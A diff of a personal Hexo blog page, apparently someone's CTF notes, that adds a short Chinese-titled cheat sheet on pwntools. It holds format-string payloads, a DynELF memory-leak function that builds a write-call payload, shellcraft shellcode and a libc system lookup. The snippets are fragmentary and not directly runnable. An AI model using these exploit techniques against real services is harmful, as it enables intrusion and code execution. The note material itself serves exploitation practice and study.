@@ -25,14 +25,12 @@
 
   
 
-<link rel="canonical" href="https://plumefox.github.io/archives/2021/11/">
+<link rel="canonical" href="https://plumefox.github.io/[object%20Object]/pwntools_Usage/">
 
 
 
   <title>
-2021 Y / 11 M -
-
-Archive |
+pwntools用法 |
 PLUMEFOX = Category = ...</title>
 <meta name="generator" content="Hexo 5.4.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -60,9 +58,19 @@ PLUMEFOX = Category = ...</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">
-      Posted on "2021Y11M"
+  <h1 itemprop="name headline">pwntools用法
   </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2021-11-16 16:55:34">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2021-11-16T16:55:34+08:00">2021-11-16</time>
+  </span>
+</div>
+
 
           </div>
         </div>
@@ -92,12 +100,12 @@ PLUMEFOX = Category = ...</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipexoj0moj20zk0m8kgu.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li>
           <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclize41wj20zk0m87gk.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclx6phq6j20zk0m8e36.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li>
         </ul>
       </div>
     </header>
@@ -118,132 +126,169 @@ PLUMEFOX = Category = ...</title>
       <div class="inner">
         <div id="main" class="pjax">
           
-  <div class="collapse wrap">
-    <h2 class="item header">
-          <a href="/archives">All</a> <small>/</small> <a href="/archives/2021">2021 Y</a> <small>/</small> 11 M<small>Archive</small>
-        
-    </h2>
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span>
+</div>
 
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2021-11-16T16:56:27+08:00"
-                  content="2021-11-16">
-              11-16
-            </time>
-          </div>
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="https://plumefox.github.io/[object%20Object]/pwntools_Usage/">
 
-          <div class="title">
-              <a href="/%5Bobject%20Object%5D/win10/" itemprop="url">
-                <span itemprop="name">虚拟机win10优化</span>
-              </a>
-          </div>
-        </article>
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="PLUMEFOX">
+    <meta itemprop="description" content="..., ">
+  </span>
 
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2021-11-16T16:55:34+08:00"
-                  content="2021-11-16">
-              11-16
-            </time>
-          </div>
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Category">
+  </span>
 
-          <div class="title">
-              <a href="/%5Bobject%20Object%5D/pwntools_Usage/" itemprop="url">
-                <span itemprop="name">pwntools用法</span>
-              </a>
-          </div>
-        </article>
+  <div class="body md" itemprop="articleBody">
+    
 
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2021-11-16T16:55:18+08:00"
-                  content="2021-11-16">
-              11-16
-            </time>
-          </div>
+    <p>#x86  ebp  e<br>
+#x64  RDI,RSI,RDX,RCX,R8,R9<br>
+#coding:utf-8</p>
+<p>context(os=‘linux’,arch=‘amd64’)<br>
+context(arch=‘amd32’)<br>
+shellcode=asm(<span class="exturl" data-url="aHR0cDovL3NoZWxsY3JhZnQuc2g=">shellcraft.sh</span>())<br>
+context.log_level = ‘DEBUG’</p>
+<p>from pwn import *</p>
+<p>s = remote(‘xxx’,xxx)<br>
+s = process(’./xxx’)<br>
+gdb.attach(s)</p>
+<p>elf = ELF(’./xxxx’)<br>
+plt = elf.plt[‘xxx’]<br>
+got = elf.got[‘xxx’]<br>
+symbols = elf.symbols[’’]</p>
+<p>addr = int(s.recvuntil(’\n’), 16)</p>
+<p>#format<br>
+payload = “aaaa_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x_%x”<br>
+payload =&quot;%85c%7$n&quot;</p>
+<p>s.recv()<br>
+s.recvuntil(‘xxx’)<br>
+s.send()<br>
+s.sendline()<br>
+s.interactive()<br>
+s.close()</p>
+<p>raw_input(’#’)</p>
+<p>#DynELF<br>
+d = DynELF(leak, elf = elf)<br>
+def leak(addr):<br>
+payload = ‘’<br>
+payload += ‘A’*padding                #padding<br>
+payload += p32 (write_addr)      #调用 write<br>
+payload += p32 (start_addr)        #write 返回到 start<br>
+payload += p32 (1)                    #write 第一个参数 fd<br>
+payload += p32 (addr)               #write 第二个参数 buf<br>
+payload += p32 (8)                    #write 第三个参数 size<br>
+s.sendline(payload)<br>
+content = s.recv()[:8]<br>
+print(&quot;%#x -&gt; %s&quot; %(addr, (content or ‘’).encode(‘hex’)))<br>
+return content</p>
+<p>def leak(addr):<br>
+payload2leak_addr = “<strong><strong>” + pack(addr) + “</strong></strong>”<br>
+s.send(payload2leak_addr)<br>
+data = s.recv()<br>
+return data</p>
+<p>d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject) system_addr = d.lookup(“system”, libc)</p>
+<p>system_addr = d.lookup(‘system’, ‘libc’)</p>
 
-          <div class="title">
-              <a href="/%5Bobject%20Object%5D/install-dvta/" itemprop="url">
-                <span itemprop="name">dvta环境搭建</span>
-              </a>
-          </div>
-        </article>
-
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2021-11-16T16:52:53+08:00"
-                  content="2021-11-16">
-              11-16
-            </time>
-          </div>
-
-          <div class="title">
-              <a href="/%5Bobject%20Object%5D/miral%E9%AA%B0%E5%A8%98%E9%85%8D%E7%BD%AE/" itemprop="url">
-                <span itemprop="name">miral骰娘配置</span>
-              </a>
-          </div>
-        </article>
-
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2021-11-16T16:52:39+08:00"
-                  content="2021-11-16">
-              11-16
-            </time>
-          </div>
-
-          <div class="title">
-              <a href="/%5Bobject%20Object%5D/mac-hdmi/" itemprop="url">
-                <span itemprop="name">mac外接2k显示器开启hdpi</span>
-              </a>
-          </div>
-        </article>
-
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2021-11-16T16:52:30+08:00"
-                  content="2021-11-16">
-              11-16
-            </time>
-          </div>
-
-          <div class="title">
-              <a href="/%5Bobject%20Object%5D/git/" itemprop="url">
-                <span itemprop="name">git基本操作</span>
-              </a>
-          </div>
-        </article>
-
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2021-11-16T14:31:47+08:00"
-                  content="2021-11-16">
-              11-16
-            </time>
-          </div>
-
-          <div class="title">
-              <a href="/%5Bobject%20Object%5D/hello-world/" itemprop="url">
-                <span itemprop="name">Hello World</span>
-              </a>
-          </div>
-        </article>
   </div>
 
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2021-11-16 17:29:22" itemprop="dateModified" datetime="2021-11-16T17:29:22+08:00">2021-11-16</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="PLUMEFOX WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="PLUMEFOX Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="PLUMEFOX PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>PLUMEFOX <i class="ic i-at"><em>@</em></i>Category
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="https://plumefox.github.io/[object%20Object]/pwntools_Usage/" title="pwntools用法">https://plumefox.github.io/[object Object]/pwntools_Usage/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
   
 
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/%5Bobject%20Object%5D/install-dvta/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipewkhf1zj20zk0m81kx.jpg" title="dvta环境搭建">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>dvta环境搭建</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/%5Bobject%20Object%5D/win10/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclfw2t96j20zk0m8x6p.jpg" title="虚拟机win10优化">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>虚拟机win10优化</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
 
 
         </div>
         <div id="sidebar">
           
+
 <div class="inner">
 
   <div class="panels">
@@ -317,14 +362,17 @@ PLUMEFOX = Category = ...</title>
 
   <ul id="quick">
     <li class="prev pjax">
+        <a href="/%5Bobject%20Object%5D/install-dvta/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
+        <a href="/%5Bobject%20Object%5D/win10/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
 </div>
+
 
         </div>
         <div class="dimmer"></div>
@@ -370,6 +418,15 @@ PLUMEFOX = Category = ...</title>
 <div class="breadcrumb">
 </div>
 
+    <span><a href="/%5Bobject%20Object%5D/install-dvta/" title="dvta环境搭建">dvta环境搭建</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
     <span><a href="/%5Bobject%20Object%5D/hello-world/" title="Hello World">Hello World</a></span>
   </li>
 
@@ -380,15 +437,6 @@ PLUMEFOX = Category = ...</title>
 </div>
 
     <span><a href="/%5Bobject%20Object%5D/win10/" title="虚拟机win10优化">虚拟机win10优化</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/%5Bobject%20Object%5D/install-dvta/" title="dvta环境搭建">dvta环境搭建</a></span>
   </li>
 
       
@@ -428,7 +476,7 @@ PLUMEFOX = Category = ...</title>
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: 'archives/2021/11/',
+    path: '[object Object]/pwntools_Usage/',
     favicon: {
       show: "（●´3｀●）Goooood",
       hide: "(´Д｀)Booooom"
